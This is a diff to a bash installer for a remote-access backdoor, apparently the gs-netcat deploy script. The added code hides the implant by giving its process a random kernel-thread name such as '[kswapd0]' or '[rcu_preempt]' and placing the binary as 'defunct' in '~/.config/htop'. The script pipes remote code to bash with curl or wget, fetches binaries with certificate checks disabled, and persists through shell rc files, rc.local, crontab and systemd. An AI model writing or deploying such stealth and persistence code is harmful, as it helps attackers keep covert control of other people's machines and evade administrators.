@@ -120,9 +120,24 @@ unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-BIN_HIDDEN_NAME_DEFAULT="gs-dbus"
-# Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
-PROC_HIDDEN_NAME_DEFAULT="[kcached]"
+BIN_HIDDEN_NAME_DEFAULT="defunct"
+# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+# Pick a process name at random
+PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+for str in "${proc_name_arr[@]}"; do
+	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+done
+PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
+
+# PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
+# ~/.config/<NAME>
+CONFIG_DIR_NAME="htop"
+
+# Names for 'uninstall' (including names from previous versions)
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
+CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
+
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
 	CG="\033[1;32m" # green
@@ -423,7 +438,8 @@ xmv()
 	src="$1"
 	dst="$2"
 
-	xcp "$src" "$dst"
+	[[ -e "$dst" ]] && xrm "$dst"
+	xcp "$src" "$dst" || return
 	xrm "$src"
 	true
 }
@@ -513,7 +529,7 @@ init_dstbin()
 
 	# Try user installation
 	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
-	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return
+	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return
 
 	# Try current working directory
 	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
@@ -712,11 +728,22 @@ init_vars()
 	# Defaults
 	# Binary file is called gs-dbus or set to same name as Process name if
 	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
-	[[ -n $GS_BIN_HIDDEN_NAME ]] && BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
-	[[ -z $BIN_HIDDEN_NAME ]] && BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
+	else
+		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
 	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
-	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
+	if [[ -n $GS_HIDDEN_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
+
 	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
@@ -752,11 +779,14 @@ init_vars()
 	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
 
 	local pids
-	pids="$(pgrep "${BIN_HIDDEN_NAME}" 2>/dev/null)"
-	# OSX's pgrep works on argv[0] proc-name
-	[[ -z $pids ]] && pids="$(pgrep "${PROC_HIDDEN_NAME//[^[:alnum:]]}" 2>/dev/null)"
+	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
+	# and also matches kernel process '[kwapd0]'.
+	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
+	# OSX's pgrep works on argv[0] proc-name:
+	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
 
 	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
+	unset pids
 
 	# DL_CMD is used for help output of how to uninstall
 	if [[ -n "$GS_USELOCAL" ]]; then
@@ -883,9 +913,8 @@ uninstall_rmdir()
 	[[ -z "$1" ]] && return
 	[[ ! -d "$1" ]] && return # return if file does not exist
 
-	xrmdir "$1" 2>/dev/null || return
-
 	echo "Removing $1..."
+	xrmdir "$1" 2>/dev/null
 }
 
 uninstall_rc()
@@ -932,59 +961,65 @@ uninstall_service()
 # Rather important function especially when testing and developing this...
 uninstall()
 {
+	local hn
+	local fn
+	local cn
+	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+		done
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "/dev/shm/${hn}"
+		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_rm "${PWD}/${hn}"
 
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd"
-	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd"
-	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
-	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
 
-	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
-	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat" #OLD
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat" #OLD
-	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat" #OLD
-	uninstall_rm "/dev/shm/${SEC_NAME}"
-	uninstall_rm "/tmp/.gsusr-${UID}${SEC_NAME}"
+		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
 
-	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
+		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+
+		# Remove from login script
+		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
+		done 
+		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"
+
+		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
+
+		## Systemd's gs-dbus.dat
+		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+	done
+
+	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
+	done
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
-	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
 	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
 	uninstall_rmdir "${TMPDIR}"
 
-	uninstall_rm "${PWD}/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${PWD}/${SEC_NAME}"
-
-	# Remove from login script
-	for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
-		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${BIN_HIDDEN_NAME}"
-		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd" #OLD
-	done 
-	uninstall_rc "${GS_PREFIX}/etc/rc.local" "${BIN_HIDDEN_NAME}" 
-	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" #OLD
-
 	# Remove crontab
-	if [[ ! $OSTYPE == *darwin* ]]; then
-		if crontab -l 2>/dev/null | grep -F -e "$BIN_HIDDEN_NAME" -e "gs-bd" &>/dev/null; then
+	unset regex
+	regex="dummy-not-exist"
+	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		# Escape regular exp special characters
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	done
+	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
+		ct="$(crontab -l 2>/dev/null)"
+		[[ "$ct" =~ ($regex) ]] && {
 			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
-			command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null
-		fi
+			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
+		}
 	fi
 
-	# Remove systemd service
-	uninstall_service "${SERVICE_DIR}" "${SERVICE_HIDDEN_NAME}"
-	uninstall_service "/etc/systemd/system" "gs-bd" #OLD
 	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
-
-	## Systemd's gs-dbus.dat
-	uninstall_rm "${SYSTEMD_SEC_FILE}"
-	uninstall_rm "/etc/systemd/system/gs-bd.dat" #OLD
 
 	echo -e "${CG}Uninstall complete.${CN}"
 	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
@@ -1282,8 +1317,6 @@ dl_ssl()
 # Download $1 and save it to $2
 dl()
 {
-	[[ -s "$2" ]] && return
-
 	# Debugging / testing. Use local package if available
 	if [[ -n "$GS_USELOCAL" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
@@ -1291,7 +1324,12 @@ dl()
 		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
-	elif [[ -n $IS_USE_CURL ]]; then
+	fi
+
+	# Delete. Maybe previous download failed.
+	[[ -s "$2" ]] && rm -f "${2:?}"
+
+	if [[ -n $IS_USE_CURL ]]; then
 		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
 	elif [[ -n $IS_USE_WGET ]]; then
 		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
@@ -1558,7 +1596,7 @@ gs_start()
 			# HERE: sec.dat has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
-			echo -e "--> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
+			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
 			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
